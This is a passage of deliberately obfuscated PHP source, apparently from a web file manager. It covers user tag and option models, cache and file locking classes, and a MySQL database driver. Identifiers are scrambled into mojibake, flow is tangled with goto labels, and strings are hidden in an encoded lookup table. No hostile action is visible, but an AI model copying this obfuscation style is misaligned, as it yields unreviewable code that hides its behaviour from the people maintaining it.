(isset($FÑ½‹î÷ãÙ[$BéëÓšÁ¯Í[$AÇ«æŸÍ³ñ[1506]]])) { $BéëÓšÁ¯Í[$AÇ«æŸÍ³ñ[1844]] = $FÑ½‹î÷ãÙ[$BéëÓšÁ¯Í[$AÇ«æŸÍ³ñ[1506]]]; } } unset($BéëÓšÁ¯Í); goto a´¶©±‚¬; a´¶©±‚¬: } private function _listAppendMeta(&$C×¶íâÊ, $Eä¾á¦ÎÀŞ) { goto EÉ„£¥¾Ã»; D®…Ÿ¬‚Î„: foreach ($Dà¦æÉ¾ÇŒ as &$eõ·Ãñç²à) { $aÓ™öÔ·èÌ = array(); foreach ($eõ·Ãñç²à as $fÎœ¥®ÉÇÔ) { if (!in_array($fÎœ¥®ÉÇÔ[$A›¸öÊÈÅ†[92]], $aí‚¬ß†Ş£)) { $aÓ™öÔ·èÌ[$fÎœ¥®ÉÇÔ[$A›¸öÊÈÅ†[92]]] = $fÎœ¥®ÉÇÔ[$A›¸öÊÈÅ†[370]]; } } $eõ·Ãñç²à = $aÓ™öÔ·èÌ; } unset($eõ·Ãñç²à); $c›Ş±ŞºŒ = Model($A›¸öÊÈÅ†[2132]); goto AÕìƒ†Òçã; eäˆ½°„ëö: $FÏ¾ÃŒãğó = array($A›¸öÊÈÅ†[1506] => array($A›¸öÊÈÅ†[7], $Eä¾á¦ÎÀŞ)); $Dà¦æÉ¾ÇŒ = Model($A›¸öÊÈÅ†[2108])->where($FÏ¾ÃŒãğó)->select(); $Dà¦æÉ¾ÇŒ = array_to_keyvalue_group($Dà¦æÉ¾ÇŒ, $A›¸öÊÈÅ†[1506]); goto D®…Ÿ¬‚Î„; AÕìƒ†Òçã: foreach ($C×¶íâÊ as &$AìùØÒøï) { $cİá©àì©› = array(); if (isset($Dà¦æÉ¾ÇŒ[$AìùØÒøï[$A›¸öÊÈÅ†[1506]]])) { $cİá©àì©› = $Dà¦æÉ¾ÇŒ[$AìùØÒøï[$A›¸öÊÈÅ†[1506]]]; } $AìùØÒøï[$A›¸öÊÈÅ†[2133]] = array(); if (isset($cİá©àì©›[$CÜ¦ŒäÜ ])) { $AìùØÒøï[$A›¸öÊÈÅ†[2133]] = $c›Ş±ŞºŒ->getUserJobInfo($cİá©àì©›[$CÜ¦ŒäÜ ]); } } unset($AìùØÒøï); goto fæ‹Œğ·«å; EÉ„£¥¾Ã»: $A›¸öÊÈÅ† =& $_SERVER[µ…]; $CÜ¦ŒäÜ  = UserJobModel::JOB_KEY; $aí‚¬ß†Ş£ = array($A›¸öÊÈÅ†[2110]); goto eäˆ½°„ëö; fæ‹Œğ·«å: } protected function groupUserAll($A×«ˆé¬) { $fÆà˜Î¹ì¼ =& $_SERVER[µ…]; if (!$A×«ˆé¬) { return !1; } $Fà×Ø”¶Ë™ = Model($fÆà˜Î¹ì¼[1751])->field($fÆà˜Î¹ì¼[1506])->where(array($fÆà˜Î¹ì¼[1669] => array($fÆà˜Î¹ì¼[7], $A×«ˆé¬)))->select(); $Fà×Ø”¶Ë™ = array_to_keyvalue($Fà×Ø”¶Ë™, $fÆà˜Î¹ì¼[33], $fÆà˜Î¹ì¼[1506]); return array_unique($Fà×Ø”¶Ë™); } public function userSearch($Bô×ö­ĞêŞ, $EÜğŸé•Ó¾ = "\52") { return Model($_SERVER[µ…][501])->where($Bô×ö­ĞêŞ)->field($EÜğŸé•Ó¾)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\160\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($E±Çâ×âÖ³) { $cå½¼Ù³àŸ =& $_SERVER[µ…]; if (!defined($cå½¼Ù³àŸ[448])) { define($cå½¼Ù³àŸ[448], 0); } return "\125\163\145\162\x4f\x70\164\151\157\156\x5f{$E±Çâ×âÖ³}\137" . USER_ID; } protected function filterWhere($c„ÒÔÜß°) { $Bˆ™ö‹ =& $_SERVER[µ…]; if (!defined($Bˆ™ö‹[448])) { define($Bˆ™ö‹[448], 0); } $c„ÒÔÜß°[$Bˆ™ö‹[1506]] = USER_ID; return $c„ÒÔÜß°; } public function cacheRemoveUser($a•µË·Îæî, $b¿ŠØŸÅÌ³) { return Cache::remove("\x55\163\x65\162\x4f\160\x74\151\157\156\x5f{$a•µË·Îæî}\x5f" . $b¿ŠØŸÅÌ³); } protected function optionDefault($Dò¨ø½ĞÄ˜ = '') { $F³‹™‡™ì¾ =& $_SERVER[µ…]; if ($Dò¨ø½ĞÄ˜ == $F³‹™‡™ì¾[33]) { return $GLOBALS[$F³‹™‡™ì¾[6]][$F³‹™‡™ì¾[2134]]; } if ($Dò¨ø½ĞÄ˜ == $F³‹™‡™ì¾[2135]) { return $GLOBALS[$F³‹™‡™ì¾[6]][$F³‹™‡™ì¾[2136]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\56\164\141\x67\x4c\151\163\x74"; public $modelType = "\125\163\145\x72\x4f\160\164\x69\157\x6e"; public $field = array("\156\x61\x6d\x65", "\163\x74\x79\154\x65", "\163\157\162\164"); public function listData($f¯£İ´× = false, $Aãä”…—Œï = "\163\157\x72\164", $FİëÃòáà¿ = false) { return parent::listData($f¯£İ´×, $Aãä”…—Œï, $FİëÃòáà¿); } public function remove($E¹²®Ê®«) { return parent::remove($E¹²®Ê®«); } public function add($c¡Ş¨…îç, $fÀŒòœ²Ğé = "\x6c\x61\x62\x65\x6c\x2d\147\x72\x65\x79\55\156\157\162\155\141\x6c") { $a¸•‡«ÜŒ =& $_SERVER[µ…]; if ($this->findByName($c¡Ş¨…îç)) { return !1; } $AÅŠÏÙØ¾ = array($a¸•‡«ÜŒ[407] => $c¡Ş¨…îç, $a¸•‡«ÜŒ[458] => $fÀŒòœ²Ğé, $a¸•‡«ÜŒ[1673] => $this->getSort($a¸•‡«ÜŒ[254]) + 1); return parent::insert($AÅŠÏÙØ¾); } public function update($f‰İ¹ñ‰©£, $c¸‚…˜õÖ´) { $f¿ÆÈÅØ® =& $_SERVER[µ…]; $d³øÁÁ–ŒŸ = $this->listData($f‰İ¹ñ‰©£); $EÑÅœö¿ôº = $this->findByName($c¸‚…˜õÖ´[$f¿ÆÈÅØ®[28]]); if (!$d³øÁÁ–ŒŸ || $EÑÅœö¿ôº && $EÑÅœö¿ôº[$f¿ÆÈÅØ®[388]] != $d³øÁÁ–ŒŸ[$f¿ÆÈÅØ®[388]]) { return !1; } return parent::update($f‰İ¹ñ‰©£, $c¸‚…˜õÖ´); } public function moveTop($fÏ‰Åõ—×) { $c›×î‹…†í =& $_SERVER[µ…]; $cÙ‰‘Ô«Ø‘ = parent::listData(); $F¿†ĞºÀ = $this->getSort($c›×î‹…†í[253]); foreach ($cÙ‰‘Ô«Ø‘ as &$cæóõ³‹õ‹) { if ($cæóõ³‹õ‹[$c›×î‹…†í[388]] == $fÏ‰Åõ—×) { $cæóõ³‹õ‹[$c›×î‹…†í[1692]] = $F¿†ĞºÀ; continue; } $cæóõ³‹õ‹[$c›×î‹…†í[1692]] += 1; } unset($cæóõ³‹õ‹); return parent::resetData($cÙ‰‘Ô«Ø‘); } public function moveBottom($D™ĞĞ›½â) { $dö¸³’›×Æ =& $_SERVER[µ…]; $DÚ›¼¹‡£¸ = $this->getSort($dö¸³’›×Æ[254]) + 1; return parent::update($D™ĞĞ›½â, array($dö¸³’›×Æ[1692] => $DÚ›¼¹‡£¸)); } public function resetSort($e¹ÕÈé‘¡Î) { goto f¹‡£‹‘Ô; eè¯´œ‚¢­: for ($cğ—­• = 0; $cğ—­• < count($e¹ÕÈé‘¡Î); $cğ—­•++) { $C­Ö„ÅË·ˆ[$e¹ÕÈé‘¡Î[$cğ—­•] . $Cš”õò–™Ü[33]] = $cğ—­• + 1; } $F ÃŒÚÉàë = parent::listData(); foreach ($F ÃŒÚÉàë as &$EÑ§á¬¶Ò) { $a¹×óİâà = $C­Ö„ÅË·ˆ[$EÑ§á¬¶Ò[$Cš”õò–™Ü[388]]]; $EÑ§á¬¶Ò[$Cš”õò–™Ü[1692]] = $a¹×óİâà ? $a¹×óİâà : $EÑ§á¬¶Ò[$Cš”õò–™Ü[1692]]; } goto b‰‘´ù“Ö; b‰‘´ù“Ö: unset($EÑ§á¬¶Ò); return parent::resetData($F ÃŒÚÉàë); goto C°äÔ¹ˆî¡; f¹‡£‹‘Ô: $Cš”õò–™Ü =& $_SERVER[µ…]; $C­Ö„ÅË·ˆ = array(); $e¹ÕÈé‘¡Î = is_array($e¹ÕÈé‘¡Î) ? $e¹ÕÈé‘¡Î : array(); goto eè¯´œ‚¢­; C°äÔ¹ˆî¡: } private function getSort($câÈÅ¸ËÚˆ) { $f…·ÉÙĞ©— =& $_SERVER[µ…]; $b¥ÚÉ¹Ÿîñ = parent::listData(); $FÔ“ù§Ôª¥ = array_to_keyvalue($b¥ÚÉ¹Ÿîñ, $f…·ÉÙĞ©—[33], $f…·ÉÙĞ©—[1692]); if (!$FÔ“ù§Ôª¥) { $FÔ“ù§Ôª¥ = array(0); } $dÓÁó¡¯áŞ = $câÈÅ¸ËÚˆ == $f…·ÉÙĞ©—[254] ? max($FÔ“ù§Ôª¥) : min($FÔ“ù§Ôª¥); return intval($dÓÁó¡¯áŞ); } } goto A©”ƒÄ¼Ó“; A¯¥ÄÛÎ½Ø: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto BâÉ¾ÈùŠê; e×Ö¥ä‚ö÷: if ($dòÀÑ„¡Œ == $C¢ß¶ğ¤‚[17] && $dê¡ÓÂ‘ä” == $C¢ß¶ğ¤‚[9]) { $dòÀÑ„¡Œ = $C¢ß¶ğ¤‚[191]; } switch ($dòÀÑ„¡Œ) { case $C¢ß¶ğ¤‚[774]: self::$handle = new CacheLockRedis(); break; case $C¢ß¶ğ¤‚[775]: self::$handle = new CacheLockMemcached(); break; case $C¢ß¶ğ¤‚[17]: self::$handle = new CacheLockDatabase(); break; case $C¢ß¶ğ¤‚[191]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto cäš©ÙâÎ£; DÄÁ£ÃºÇï: self::$timeout = $FìˆŠŸã’„[$C¢ß¶ğ¤‚[784]] ? $FìˆŠŸã’„[$C¢ß¶ğ¤‚[784]] : 10; $dê¡ÓÂ‘ä” = _get($GLOBALS[$C¢ß¶ğ¤‚[6]], $C¢ß¶ğ¤‚[785]); $dòÀÑ„¡Œ = $FìˆŠŸã’„[$C¢ß¶ğ¤‚[771]] ? $FìˆŠŸã’„[$C¢ß¶ğ¤‚[771]] : $C¢ß¶ğ¤‚[191]; goto e×Ö¥ä‚ö÷; BâÉ¾ÈùŠê: $C¢ß¶ğ¤‚ =& $_SERVER[µ…]; if (self::$handle) { return self::$handle; } $FìˆŠŸã’„ = $GLOBALS[$C¢ß¶ğ¤‚[6]][$C¢ß¶ğ¤‚[345]]; goto DÄÁ£ÃºÇï; cäš©ÙâÎ£: } private static function key($dî‚‹İÔ¹) { return $_SERVER[µ…][786] . Cache::key($dî‚‹İÔ¹); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AÏ†šŸÑ¨ = '') { self::$errorMsg = $AÏ†šŸÑ¨; } public static function lockGlobal($D‰»¢”†èØ, $aÄ£Ô³È’) { return self::lock($D‰»¢”†èØ, $aÄ£Ô³È’, !0); } public static function lock($aåª¤­‡‘Œ, $aˆºÈåĞàÂ = false, $d”–ŒÊÆæì = false) { goto e°îâİ¬; A„ŒÕÆŒÌë: if (!$d”–ŒÊÆæì) { self::$lockItem[$fß¬±ÁšÎ·] = !0; } return $d¾æˆ¿‰¾; goto cğ¥ÄÉïÙà; e°îâİ¬: $c†¾°Òåõ‡ =& $_SERVER[µ…]; $C†âˆ‡Ã˜‘ = self::init(); $fß¬±ÁšÎ· = self::key($aåª¤­‡‘Œ); goto eÑÇšÈÈì¨; eÑÇšÈÈì¨: $aˆºÈåĞàÂ = $aˆºÈåĞàÂ ? $aˆºÈåĞàÂ : self::$timeout; $d¾æˆ¿‰¾ = $C†âˆ‡Ã˜‘->lock($fß¬±ÁšÎ·, $aˆºÈåĞàÂ); if (!$d¾æˆ¿‰¾) { $AÛ§Ğ´ Ğ· = "\154\x6f\143\x6b\40\145\162\x72\x6f\x72\73\153\x65\x79\75{$aåª¤­‡‘Œ}\x3b\x74\x69\155\x65\x3d{$aˆºÈåĞàÂ}\x3b" . self::$errorMsg . $c†¾°Òåõ‡[67] . get_caller_msg(); $f„ø‚ïéÎÕ = LNG($c†¾°Òåõ‡[787]) . "\50{$aˆºÈåĞàÂ}\163\x29\56" . LNG($c†¾°Òåõ‡[788]); $f„ø‚ïéÎÕ .= $c†¾°Òåõ‡[789]; if (is_string(self::$errorMsg) && self::$errorMsg) { $f„ø‚ïéÎÕ = $f„ø‚ïéÎÕ . $c†¾°Òåõ‡[790] . self::$errorMsg; } write_log($AÛ§Ğ´ Ğ·, $c†¾°Òåõ‡[791]); show_json($f„ø‚ïéÎÕ, !1); } goto A„ŒÕÆŒÌë; cğ¥ÄÉïÙà: } public static function lockGet($E­®Ã«¸) { $EÊ•Š»Ú©® = self::key($E­®Ã«¸); if (self::$lockItem[$EÊ•Š»Ú©®]) { return self::$lockItem[$EÊ•Š»Ú©®]; } return self::init()->lockGet($EÊ•Š»Ú©®); } public static function unlock($déÈ²çÏµ¹) { $c—¬¢©Ùº = self::key($déÈ²çÏµ¹); self::$lockItem[$c—¬¢©Ùº] = null; return self::init()->unlock($c—¬¢©Ùº); } public static function unlockRuntime() { $B•ôëö°× =& $_SERVER[µ…]; $A¦÷«áâ‹” = self::init(); $EÔ’ŸÛ§÷˜ = !1; foreach (self::$lockItem as $B‰Ÿ»ŸÂÊ‹ => $Aé÷ğÆ¥Ñ) { if (!$Aé÷ğÆ¥Ñ) { continue; } $A¦÷«áâ‹”->unlock($B‰Ÿ»ŸÂÊ‹); if (!$EÔ’ŸÛ§÷˜) { $EÔ’ŸÛ§÷˜ = !0; write_log($B•ôëö°×[792] . $B‰Ÿ»ŸÂÊ‹ . $B•ôëö°×[67] . get_caller_msg(), $B•ôëö°×[791]); continue; } write_log($B•ôëö°×[792] . $B‰Ÿ»ŸÂÊ‹, $B•ôëö°×[791]); } self::fileUnlockAll(); } public static function fileLock($Cµ—Æœ¬™ª) { goto E°Ó¡®¼½®; aå¬İ’Öñ¡: $C¬ïÑğ¢é¨ = fopen(DATA_PATH . $Cµ—Æœ¬™ª . $CêÍ©åô¾Ë[794], $CêÍ©åô¾Ë[795]); if (!$C¬ïÑğ¢é¨) { return !1; } $GLOBALS[$CêÍ©åô¾Ë[793]][$Cµ—Æœ¬™ª] = $C¬ïÑğ¢é¨; goto c¯ˆâÅÊ…¡; E°Ó¡®¼½®: $CêÍ©åô¾Ë =& $_SERVER[µ…]; if (!$GLOBALS[$CêÍ©åô¾Ë[793]]) { $GLOBALS[$CêÍ©åô¾Ë[793]] = array(); } $GLOBALS[$CêÍ©åô¾Ë[793]][$Cµ—Æœ¬™ª] = !1; goto aå¬İ’Öñ¡; fØö—ìÀÔç: return !1; goto C¼„îÔ§¥; c¯ˆâÅÊ…¡: if (flock($C¬ïÑğ¢é¨, LOCK_EX)) { return !0; } self::unlock($Cµ—Æœ¬™ª); show_json($CêÍ©åô¾Ë[796], !1); goto fØö—ìÀÔç; C¼„îÔ§¥: } public static function fileUnlock($D‚¡áæšÓë) { $c±„²ÊÚ˜¼ =& $_SERVER[µ…]; $fŸ‡ãËõŸ = $GLOBALS[$c±„²ÊÚ˜¼[793]][$D‚¡áæšÓë]; if (!$fŸ‡ãËõŸ) { return; } $GLOBALS[$c±„²ÊÚ˜¼[793]][$D‚¡áæšÓë] = !1; flock($fŸ‡ãËõŸ, LOCK_UN); fclose($fŸ‡ãËõŸ); } public static function fileUnlockAll() { $f‘´¥ˆƒäç =& $_SERVER[µ…]; if (!$GLOBALS[$f‘´¥ˆƒäç[793]]) { return; } foreach ($GLOBALS[$f‘´¥ˆƒäç[793]] as $cÓµ¤çÈ => $Eàµ¢Óåæ¬) { if (!$Eàµ¢Óåæ¬) { continue; } $GLOBALS[$f‘´¥ˆƒäç[793]][$cÓµ¤çÈ] = !1; flock($Eàµ¢Óåæ¬, LOCK_UN); fclose($Eàµ¢Óåæ¬); } $GLOBALS[$f‘´¥ˆƒäç[793]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Eõ¸¯¡¡„º =& $_SERVER[µ…]; $bóçˆêÊÜ‚ = $GLOBALS[$Eõ¸¯¡¡„º[6]][$Eõ¸¯¡¡„º[345]]; self::$cachePath = $bóçˆêÊÜ‚[$Eõ¸¯¡¡„º[191]][$Eõ¸¯¡¡„º[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($aª¨¥Üì£˜, $DÌù‹æÇ¦³ = 0) { goto E´ŸôÔšáª; BÓá½ÑÙ”µ: $this->unlock($aª¨¥Üì£˜); return !1; goto D‘ÓœÚĞ„¼; Fã»¦í´ÕĞ: $a—Îø×é“ = rtrim(self::$cachePath, $cùƒ¶çƒÀ¹[8]) . $cùƒ¶çƒÀ¹[797] . md5($aª¨¥Üì£˜) . $cùƒ¶çƒÀ¹[794]; if (file_exists($a—Îø×é“) && filemtime($a—Îø×é“) && filemtime($a—Îø×é“) < time() - 10) { @unlink($a—Îø×é“); } do { if (file_exists($a—Îø×é“)) { cacheLockWait(); continue; } $B„¾Ôãî©„ = fopen($a—Îø×é“, $cùƒ¶çƒÀ¹[798]); if (!$B„¾Ôãî©„) { return !1; } $C Í„•ÙŒ = flock($B„¾Ôãî©„, LOCK_EX | LOCK_NB); self::$caches[$aª¨¥Üì£˜] = array($cùƒ¶çƒÀ¹[799] => $B„¾Ôãî©„, $cùƒ¶çƒÀ¹[191] => $a—Îø×é“); fwrite($B„¾Ôãî©„, $B¶Š£·’½Ò); clearstatcache(); if ($B„¾Ôãî©„ && $C Í„•ÙŒ) { return !0; } cacheLockWait(); } while (microtime(!0) < $B¶Š£·’½Ò); goto BÓá½ÑÙ”µ; E´ŸôÔšáª: $cùƒ¶çƒÀ¹ =& $_SERVER[µ…]; $Eñ—¬çåù = microtime(!0); $B¶Š£·’½Ò = $Eñ—¬çåù + $DÌù‹æÇ¦³ + 0.0001; goto Fã»¦í´ÕĞ; D‘ÓœÚĞ„¼: } public function lockGet($Eêæ­’¢ÀÈ) { $CŞ…¿ÀÑå =& $_SERVER[µ…]; $cÃğ³´²ÙÏ = rtrim(self::$cachePath, $CŞ…¿ÀÑå[8]) . $CŞ…¿ÀÑå[797] . md5($Eêæ­’¢ÀÈ) . $CŞ…¿ÀÑå[794]; return file_exists($cÃğ³´²ÙÏ); } public function unlock($d¬©äŒ•¿§) { goto e¤„ÚÔÒİî; e¤„ÚÔÒİî: $eÎ ¸ØäÜ• =& $_SERVER[µ…]; $F£˜²„Ó = self::$caches[$d¬©äŒ•¿§]; if (!$F£˜²„Ó) { return; } goto d©«òøîŒ™; d©«òøîŒ™: @flock($F£˜²„Ó[$eÎ ¸ØäÜ•[799]], LOCK_UN); @fclose($F£˜²„Ó[$eÎ ¸ØäÜ•[799]]); @unlink($F£˜²„Ó[$eÎ ¸ØäÜ•[191]]); goto aÃ“ÜÁ…; aÃ“ÜÁ…: unset(self::$caches[$d¬©äŒ•¿§]); goto f×†„ß¸·À; f×†„ß¸·À: } } goto cÖÁ„®ßÂ; f½êšÉ«šô: class DbMysql extends Db { public function __construct($Dß’‘ª§İµ = '') { $a´¾“äŒï° =& $_SERVER[µ…]; if (!extension_loaded($a´¾“äŒï°[744])) { think_exception(think_lang($a´¾“äŒï°[10]) . $a´¾“äŒï°[823]); } if (!empty($Dß’‘ª§İµ)) { $this->config = $Dß’‘ª§İµ; if (empty($this->config[$a´¾“äŒï°[13]])) { $this->config[$a´¾“äŒï°[13]] = $a´¾“äŒï°[33]; } } } public function connect($BøÚÒò¼ì¥ = '', $E±’™—‘Æ = 0, $aºàòÈ‡« = false) { $CˆÛ¦ÛŒÀ =& $_SERVER[µ…]; if (!isset($this->linkID[$E±’™—‘Æ])) { goto FÉ¾ˆá½‹Ú; e¿ŠË½Ãº£: if (1 != think_config($CˆÛ¦ÛŒÀ[18])) { unset($this->config); } goto AºÏ‚°ÑÉ; FÉ¾ˆá½‹Ú: if (empty($BøÚÒò¼ì¥)) { $BøÚÒò¼ì¥ = $this->config; } $c‘óÑŒ¶ » = $BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[824]] . ($BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[825]] ? "\x3a{$BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[825]]}" : $CˆÛ¦ÛŒÀ[33]); $cî™Éö¾°´ = !empty($BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[13]][$CˆÛ¦ÛŒÀ[14]]) ? $BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[13]][$CˆÛ¦ÛŒÀ[14]] : $this->pconnect; goto A‹Ã÷î¹Şã; eóéÏ˜¹Û¤: mysql_query($CˆÛ¦ÛŒÀ[828] . think_config($CˆÛ¦ÛŒÀ[829]) . $CˆÛ¦ÛŒÀ[55], $this->linkID[$E±’™—‘Æ]); if ($EßÈÊÀ‹öŠ > $CˆÛ¦ÛŒÀ[830]) { mysql_query($CˆÛ¦ÛŒÀ[831], $this->linkID[$E±’™—‘Æ]); } $this->connected = !0; goto e¿ŠË½Ãº£; A‹Ã÷î¹Şã: if ($cî™Éö¾°´) { $this->linkID[$E±’™—‘Æ] = mysql_pconnect($c‘óÑŒ¶ », $BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[826]], $BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[827]], 131072); } else { $this->linkID[$E±’™—‘Æ] = mysql_connect($c‘óÑŒ¶ », $BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[826]], $BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[827]], !0, 131072); } if (!$this->linkID[$E±’™—‘Æ] || !empty($BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[17]]) && !mysql_select_db($BøÚÒò¼ì¥[$CˆÛ¦ÛŒÀ[17]], $this->linkID[$E±’™—‘Æ])) { think_exception(mysql_error()); } $EßÈÊÀ‹öŠ = mysql_get_server_info($this->linkID[$E±’™—‘Æ]); goto eóéÏ˜¹Û¤; AºÏ‚°ÑÉ: } return $this->linkID[$E±’™—‘Æ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($F·İŒØèÂÑ) { goto DÏÃĞìŒ‹; EÁ÷Ãƒóï°: think_action_status($c½»¶³…[19], 1); think_status($c½»¶³…[20]); $this->queryID = mysql_query($F·İŒØèÂÑ, $this->_linkID); goto Dæäƒöñ–É; DÏÃĞìŒ‹: $c½»¶³… =& $_SERVER[µ…]; if (0 === stripos($F·İŒØèÂÑ, $c½»¶³…[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto d–Š²šˆ‹; Dæäƒöñ–É: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto cÖ‹‹˜±îÕ; d–Š²šˆ‹: if (!$this->_linkID) { return !1; } $this->queryStr = $F·İŒØèÂÑ; if ($this->queryID) { $this->free(); } goto EÁ÷Ãƒóï°; cÖ‹‹˜±îÕ: } public function execute($CÃ–Šá¼×) { goto aÍŠ½‘Õ¿—; DÇìÚÅ¹å‰: think_status($FíùÊÓ›‹è[20]); $a„ª®Öò» = mysql_query($CÃ–Šá¼×, $this->_linkID); $this->debug(); goto dİ‘íÅ•ï; aÍŠ½‘Õ¿—: $FíùÊÓ›‹è =& $_SERVER[µ…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F’èéó•ßÓ; dİ‘íÅ•ï: if (!1 === $a„ª®Öò») { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dö‰•…Œ¸Ñ; F’èéó•ßÓ: $this->queryStr = $CÃ–Šá¼×; if ($this->queryID) { $this->free(); } think_action_status($FíùÊÓ›‹è[21], 1); goto DÇìÚÅ¹å‰; dö‰•…Œ¸Ñ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[µ…][832], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B»Ü£…· = mysql_query($_SERVER[µ…][833], $this->_linkID); $this->transTimes = 0; if (!$B»Ü£…·) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b¥’Ò…ê«š = mysql_query($_SERVER[µ…][834], $this->_linkID); $this->transTimes = 0; if (!$b¥’Ò…ê«š) { $this->error(); return !1; } } return !0; } private function getAll() { $d‚Èˆ÷´ğ‹ = array(); if ($this->numRows > 0) { while ($BõÃÂèÎÌ = mysql_fetch_assoc($this->queryID)) { $d‚Èˆ÷´ğ‹[] = $BõÃÂèÎÌ; } mysql_data_seek($this->queryID, 0); } return $d‚Èˆ÷´ğ‹; } public function getFields($c«Ş£ñĞÈŞ) { $Fø‡â½À¾ä =& $_SERVER[µ…]; $eíŠÄæÈ©¡ = $this->query($Fø‡â½À¾ä[835] . $this->parseKey($c«Ş£ñĞÈŞ)); $F¹Üø•„º = array(); if ($eíŠÄæÈ©¡) { foreach ($eíŠÄæÈ©¡ as $E×æÑ‹ìßö => $BÔ»·ŸÎÈ) { $F¹Üø•„º[$BÔ»·ŸÎÈ[$Fø‡â½À¾ä[27]]] = array($Fø‡â½À¾ä[28] => $BÔ»·ŸÎÈ[$Fø‡â½À¾ä[27]], $Fø‡â½À¾ä[29] => $BÔ»·ŸÎÈ[$Fø‡â½À¾ä[30]], $Fø‡â½À¾ä[31] => (bool) (strtoupper($BÔ»·ŸÎÈ[$Fø‡â½À¾ä[32]]) === $Fø‡â½À¾ä[836]), $Fø‡â½À¾ä[34] => $BÔ»·ŸÎÈ[$Fø‡â½À¾ä[35]], $Fø‡â½À¾ä[36] => strtolower($BÔ»·ŸÎÈ[$Fø‡â½À¾ä[37]]) == $Fø‡â½À¾ä[38], $Fø‡â½À¾ä[39] => strtolower($BÔ»·ŸÎÈ[$Fø‡â½À¾ä[40]]) == $Fø‡â½À¾ä[41]); } } return $F¹Üø•„º; } public function getTables($dºšßÊÇˆ = '') { $Cõ•„—ñÆ‚ =& $_SERVER[µ…]; if (!empty($dºšßÊÇˆ)) { $b¬¥á…µãŸ = $Cõ•„—ñÆ‚[837] . $dºšßÊÇˆ . $Cõ•„—ñÆ‚[838]; } else { $b¬¥á…µãŸ = $Cõ•„—ñÆ‚[839]; } $C›ÈË¢¹¹Ï = $this->query($b¬¥á…µãŸ); $DåŒà•²µæ = array(); foreach ($C›ÈË¢¹¹Ï as $a’…‚Ú‹Ğˆ => $C¯Ú±¬Œ¯•) { $DåŒà•²µæ[$a’…‚Ú‹Ğˆ] = current($C¯Ú±¬Œ¯•); } return $DåŒà•²µæ; } public function replace($d¼“÷Ã¾, $Bé­¹Ã“µ = array()) { $eÜ¥§á…Ù† =& $_SERVER[µ…]; foreach ($d¼“÷Ã¾ as $AÍ×òÖ‹„£ => $Cê¤»†á™á) { $C‡Ì‡ßÌµ¿ = $this->parseValue($Cê¤»†á™á); if (is_scalar($C‡Ì‡ßÌµ¿)) { $FÓÑîÅ‚ï[] = $C‡Ì‡ßÌµ¿; $càïÍ£«Õ[] = $this->parseKey($AÍ×òÖ‹„£); } } $F³Õøàöõë = $eÜ¥§á…Ù†[840] . $this->parseTable($Bé­¹Ã“µ[$eÜ¥§á…Ù†[275]]) . $eÜ¥§á…Ù†[841] . implode($eÜ¥§á…Ù†[47], $càïÍ£«Õ) . $eÜ¥§á…Ù†[842] . implode($eÜ¥§á…Ù†[47], $FÓÑîÅ‚ï) . $eÜ¥§á…Ù†[843]; return $this->execute($F³Õøàöõë); } public function insertAll($FîğçøàÎò, $EÖŠ¿˜øˆ = array(), $A®ğˆÓ­“í = false) { goto b„Û™™•©É; B¹•³ÛÙÕ˜: $f©¥™çŒ¡• = ($A®ğˆÓ­“í ? $aÕÔŞĞ…‡Ù[845] : $aÕÔŞĞ…‡Ù[846]) . $aÕÔŞĞ…‡Ù[847] . $this->parseTable($EÖŠ¿˜øˆ[$aÕÔŞĞ…‡Ù[275]]) . $aÕÔŞĞ…‡Ù[841] . implode($aÕÔŞĞ…‡Ù[47], $Dê¶öÁç¡­) . $aÕÔŞĞ…‡Ù[848] . implode($aÕÔŞĞ…‡Ù[47], $d·†Õ˜Âë); return $this->execute($f©¥™çŒ¡•); goto béËÊ²…Ê²; b„Û™™•©É: $aÕÔŞĞ…‡Ù =& $_SERVER[µ…]; if (!is_array($FîğçøàÎò[0])) { return !1; } $Dê¶öÁç¡­ = array_keys($FîğçøàÎò[0]); goto BåÄ¹ÛİéÒ; BåÄ¹ÛİéÒ: $d·†Õ˜Âë = array(); foreach ($FîğçøàÎò as $cö°ÍÄ‹Ğ¾) { $AïÛïˆÙÏ = array(); foreach ($cö°ÍÄ‹Ğ¾ as $Dñ¨ô–¤Êê => $eŒªÖ²ÓÙ) { $eŒªÖ²ÓÙ = $this->parseValue($eŒªÖ²ÓÙ); if (is_scalar($eŒªÖ²ÓÙ)) { $AïÛïˆÙÏ[] = $eŒªÖ²ÓÙ; } } $d·†Õ˜Âë[] = $aÕÔŞĞ…‡Ù[256] . implode($aÕÔŞĞ…‡Ù[47], $AïÛïˆÙÏ) . $aÕÔŞĞ…‡Ù[843]; } array_walk($Dê¶öÁç¡­, array($this, 